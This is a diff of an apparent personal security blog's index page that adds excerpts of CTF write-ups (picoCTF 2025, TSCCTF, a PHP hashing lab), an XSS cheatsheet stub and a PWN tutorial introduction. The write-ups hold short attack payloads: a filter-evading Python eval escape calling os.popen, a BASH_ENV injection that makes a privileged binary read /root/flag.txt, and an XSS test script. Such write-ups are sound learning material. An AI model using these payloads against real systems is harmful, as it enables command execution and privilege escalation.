@@ -593,6 +366,311 @@
         
     </div>
     <a href="/2025/03/24/hello-world/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/03/11/picoctf-2025-write-ups/">
+        <h2 class="post-title">picoCTF 2025 write-ups</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/3/11
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="picoCTF-2025-write-ups"><a href="#picoCTF-2025-write-ups" class="headerlink" title="picoCTF 2025 write-ups"></a>picoCTF 2025 write-ups</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="3v-l"><a href="#3v-l" class="headerlink" title="3v@l"></a>3v@l</h3><p>payload: getattr(<strong>import</strong>(‘o’+’s’), ‘po’+’pen’)(‘tac${IFS}’+chr(47)+’fl*’).read()</p>
+<h3 id="SSTI2"><a href="#SSTI2" class="headerlink" title="SSTI2"></a>SSTI2</h3><p>payload: </p>
+<h3 id="WebSockFish"><a href="#WebSockFish" class="headerlink" title="WebSockFish"></a>WebSockFish</h3><p>在console裡面控制遊戲</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">game.load(&quot;8/8/8/8/8/8/8/R7 w - - 0 1&quot;);</span><br><span class="line">true</span><br><span class="line">board.position(game.fen());</span><br><span class="line">undefined</span><br><span class="line">makeBestMove();</span><br><span class="line">undefined</span><br><span class="line">ws.send(&quot;mate 0&quot;);</span><br><span class="line">undefined</span><br><span class="line">3verbal-sleep.picoctf.net/:1 Uncaught (in promise) Error: A listener indicated an asynchronous response by returning true, but the message channel closed before a response was received</span><br><span class="line">sendMessage(&quot;mate -1&quot;)  // 表示AI被將軍，1步內輸掉</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval -9999&quot;)  // 表示AI處於極其不利的局面</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;mate -1&quot;)  // </span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval 12&quot;)  // </span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval -10&quot;)  // </span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval -999999999999999&quot;)  // 這樣才是win in a convincing manner</span><br><span class="line"></span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
+
+<h3 id="Apriti-sesamo"><a href="#Apriti-sesamo" class="headerlink" title="Apriti sesamo"></a>Apriti sesamo</h3><p>emacs 代表可以在網址後加一個 ~<br>會發現網頁原始碼有隱藏的判斷邏輯程式碼<br>發現其實就是SHA1 collision</p>
+<p><img src="https://hackmd.io/_uploads/HyEYaRFj1e.png" alt="image"></p>
+<h3 id="Hash-only-1"><a href="#Hash-only-1" class="headerlink" title="Hash-only 1"></a>Hash-only 1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ echo &#x27;cat /root/flag.txt&#x27; &gt; /tmp/exploit.sh</span><br><span class="line">ctf-player@pico-chall$ export BASH_ENV=/tmp/exploit.sh</span><br><span class="line">ctf-player@pico-chall$ ./flaghasher</span><br><span class="line">Computing the MD5 hash of /root/flag.txt....</span><br><span class="line"></span><br><span class="line">picoCTF&#123;sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_ae1d8678&#125;4d4f660d53535446f15c1a3a7b535e50  /root/flag.txt</span><br></pre></td></tr></table></figure>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #03a9f4">CTF</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/picoCTF/" style="color: #00a596">picoCTF</a>
+        </span>
+        
+    </div>
+    <a href="/2025/03/11/picoctf-2025-write-ups/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/03/08/xss-cheatsheat/">
+        <h2 class="post-title">XSS Cheatsheat</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/3/8
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="XSS-Cheatsheet"><a href="#XSS-Cheatsheet" class="headerlink" title="XSS Cheatsheet"></a>XSS Cheatsheet</h1><h3 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h3><p><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code> : 先測試有沒有辦法送指令進去</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/XSS/" style="color: #03a9f4">XSS</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Notes/" style="color: #ffa2c4">Notes</a>
+        </span>
+        
+    </div>
+    <a href="/2025/03/08/xss-cheatsheat/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/03/07/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8%E5%AF%A6%E5%8B%99%E8%88%87%E7%A4%BE%E6%9C%83%E5%AF%A6%E8%B8%90%E4%BD%9C%E6%A5%AD%E4%B8%80/">
+        <h2 class="post-title">【網路安全實務與社會實踐】作業一 Write-up</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/3/7
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="【網路安全實務與社會實踐】作業一"><a href="#【網路安全實務與社會實踐】作業一" class="headerlink" title="【網路安全實務與社會實踐】作業一"></a>【網路安全實務與社會實踐】作業一</h1><blockquote>
+<p>此次 Lab 共為兩題</p>
+<ol>
+<li>phpisnice <a target="_blank" rel="noopener" href="https://class.nckuctf.org/challenges#phpisnice-12">https://class.nckuctf.org/challenges#phpisnice-12</a></li>
+<li>phpisbest <a target="_blank" rel="noopener" href="https://class.nckuctf.org/challenges#phpisbest-13">https://class.nckuctf.org/challenges#phpisbest-13</a></li>
+</ol>
+</blockquote>
+<h3 id="phpisnice"><a href="#phpisnice" class="headerlink" title="phpisnice"></a>phpisnice</h3><p>先看一下網頁給的資訊</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">$A = $_GET[&#x27;A&#x27;];</span><br><span class="line">$B = $_GET[&#x27;B&#x27;];</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($A) &amp;&amp; isset($B))</span><br><span class="line">    if ($A != $B)</span><br><span class="line">        if (strcmp($A, $B) == 0)</span><br><span class="line">            if (md5($A) == md5($B))</span><br><span class="line">                echo $flag;</span><br><span class="line">            else die(&#x27;ERROR: MD5(A) != MD5(B)&#x27;);</span><br><span class="line">        else die(&#x27;ERROR: strcmp(A, B) != 0&#x27;);</span><br><span class="line">    else die(&#x27;ERROR: A == B&#x27;);</span><br><span class="line">else die(&#x27;ERROR: A, B should be given&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>可以看出題目要求：<code>要求找到一個值 A，使得 md5(A) == A</code><br>所以這題是標準的「md5碰撞」</p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #ff7d73">CTF</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/CyberSecurity/" style="color: #ffa2c4">CyberSecurity</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/NCKUCTF/" style="color: #00a596">NCKUCTF</a>
+        </span>
+        
+    </div>
+    <a href="/2025/03/07/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8%E5%AF%A6%E5%8B%99%E8%88%87%E7%A4%BE%E6%9C%83%E5%AF%A6%E8%B8%90%E4%BD%9C%E6%A5%AD%E4%B8%80/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/02/04/pwn-%E6%95%99%E5%AD%B8%E6%8C%87%E5%8D%97/">
+        <h2 class="post-title">PWN 教學指南</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/2/4
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>重點包括：</p>
+<ul>
+<li><strong>基礎知識與概念</strong>（PWN 是什麼、CTF 題型介紹）</li>
+<li><strong>必要技能</strong>（逆向工程、漏洞分析、各類漏洞原理）</li>
+<li><strong>工具介紹</strong>（GDB、IDA Pro、pwntools、Radare2 等）</li>
+<li><strong>實戰案例</strong>（著名攻擊案例與 CTF 題目解析）</li>
+<li><strong>進階技巧</strong>（ROP、Heap Exploitation、Kernel Exploitation 等）</li>
+<li><strong>學習資源</strong>（免費與付費資源，包括影片與文字教學）</li>
+</ul>
+<p>同時會重點介紹 <strong>Hack The Box</strong> 與 <strong>Pwnable.tw</strong> 平台的挑戰，並涵蓋 Linux 與 Windows 的 Kernel Exploitation。</p>
+<h1 id="PWN-教學指南"><a href="#PWN-教學指南" class="headerlink" title="PWN 教學指南"></a>PWN 教學指南</h1><p>本指南將帶你從新手一路進階學習 PWN（<strong>Pwn</strong> 即「<strong>擁有</strong> &#x2F; <strong>攻破</strong>」的黑客俚語）相關技術，包含必要基礎知識、常見漏洞類型、實用工具介紹、實戰範例解析以及進階技巧，並提供 C&#x2F;C++ 與 Python 的實作範例。同時，我們也會強調 <strong>Kernel Exploitation（內核利用）</strong> 技術，幫助你了解在 Linux 與 Windows 核心層面的漏洞利用方法。</p>
+<h2 id="1-基礎知識與概念"><a href="#1-基礎知識與概念" class="headerlink" title="1. 基礎知識與概念"></a>1. 基礎知識與概念</h2><h3 id="PWN-是什麼？"><a href="#PWN-是什麼？" class="headerlink" title="PWN 是什麼？"></a>PWN 是什麼？</h3><p>「PWN」原是黑客圈的俚語，意思是<strong>攻破裝置或系統並取得控制權</strong>。發音類似「砰」，象徵成功駭入系統的一聲巨響。在網路安全語境中，PWN 指透過漏洞利用、社交工程等手段，成功獲得裝置、系統或網路的未授權控制權。一旦<strong>PWN</strong> 了某系統，攻擊者便可執行任意惡意操作，例如竊取資料、植入惡意程式或癱瘓系統服務。</p>
+<h3 id="CTF-中-PWN-題型介紹"><a href="#CTF-中-PWN-題型介紹" class="headerlink" title="CTF 中 PWN 題型介紹"></a>CTF 中 PWN 題型介紹</h3><p>在 CTF（Capture The Flag）競賽中，PWN 題目通常提供一個已編譯好的<strong>二進位程式</strong>（例如 Linux ELF 或 Windows PE 檔案），該程式部署在目標伺服器上。參賽者需要對這個程式進行逆向分析和動態調試，找出其中的漏洞，透過網路與服務互動並加以利用。PWN 題目的目標通常是<strong>取得遠端系統的 shell 權限</strong>或直接讀取旗標檔案。常見的 PWN 題目漏洞包含：棧&#x2F;堆緩衝區溢位、整數溢位、格式化字串漏洞等。總之，在 CTF PWN 題中，你需要發揮二進位漏洞挖掘與利用能力，突破沙盒或權限限制拿到目標系統的控制權。</p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/Self-learning/" style="color: #ffa2c4">Self-learning</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #00a596">pwn</a>
+        </span>
+        
+    </div>
+    <a href="/2025/02/04/pwn-%E6%95%99%E5%AD%B8%E6%8C%87%E5%8D%97/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/01/16/2025-tscctf-writeup/">
+        <h2 class="post-title">2025 TSCCTF writeup</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/1/16
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="2025-TSCCTF-owl-d-writeup"><a href="#2025-TSCCTF-owl-d-writeup" class="headerlink" title="2025 TSCCTF owl_d writeup"></a>2025 TSCCTF owl_d writeup</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><h3 id="Give-you-a-free-flag"><a href="#Give-you-a-free-flag" class="headerlink" title="Give you a free flag"></a>Give you a free flag</h3><p><img src="https://hackmd.io/_uploads/HyswtsHwJe.png" alt="image"><br>反白就可以找到flag</p>
+<h3 id="Please-join-our-discord"><a href="#Please-join-our-discord" class="headerlink" title="Please join our discord"></a>Please join our discord</h3><p><img src="https://hackmd.io/_uploads/SJgaKoHP1l.png" alt="image"><br>在announcement這裡<br>（我找了一天 哭）</p>
+<h3 id="Feedback-Form"><a href="#Feedback-Form" class="headerlink" title="Feedback Form"></a>Feedback Form</h3><p>填問卷</p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="What-Happened"><a href="#What-Happened" class="headerlink" title="What_Happened"></a>What_Happened</h3><p>丟到Ghidra去分析<br>先看一下Defined Strings有沒有特別的<br><img src="https://hackmd.io/_uploads/SynloiHv1l.png" alt="image"><br>發現右下角有一段跟flag相關<br>點兩下go to發現main function<br><img src="https://hackmd.io/_uploads/SkzvisrDkl.png" alt="image"><br>在他附近也可以馬上看到Decrypted Flag的相關函數<br><img src="https://hackmd.io/_uploads/r1Er3sHw1l.png" alt="image"><br>所以可以看出是用XOR解密，接下來把encrypted flag找出來就好</p>
+<p><img src="https://hackmd.io/_uploads/B1BKnirPyg.png" alt="image"><br>找到之後全部對0xAA做XOR，最後就可以得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSC&#123;I_Think_you_Fix_2ome_3rror&#125;</span><br></pre></td></tr></table></figure>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/TSCCTF/" style="color: #00a596">TSCCTF</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #ff7d73">CTF</a>
+        </span>
+        
+    </div>
+    <a href="/2025/01/16/2025-tscctf-writeup/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -642,17 +720,17 @@
         
         <span class="tag">
             
-            <a href="/tags/Kali-Linux/" style="color: #ffa2c4">Kali Linux</a>
+            <a href="/tags/Kali-Linux/" style="color: #03a9f4">Kali Linux</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8E%83%E6%8F%8F/" style="color: #ff7d73">漏洞掃描</a>
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8E%83%E6%8F%8F/" style="color: #00bcd4">漏洞掃描</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8%E8%A9%95%E4%BC%B0/" style="color: #ffa2c4">安全評估</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8%E8%A9%95%E4%BC%B0/" style="color: #ff7d73">安全評估</a>
         </span>
         
     </div>
@@ -706,12 +784,12 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%9A%B1%E7%A7%81%E4%BF%9D%E8%AD%B7/" style="color: #ffa2c4">隱私保護</a>
+            <a href="/tags/%E9%9A%B1%E7%A7%81%E4%BF%9D%E8%AD%B7/" style="color: #03a9f4">隱私保護</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8%E6%84%8F%E8%AD%98/" style="color: #00bcd4">安全意識</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8%E6%84%8F%E8%AD%98/" style="color: #ffa2c4">安全意識</a>
         </span>
         
         <span class="tag">
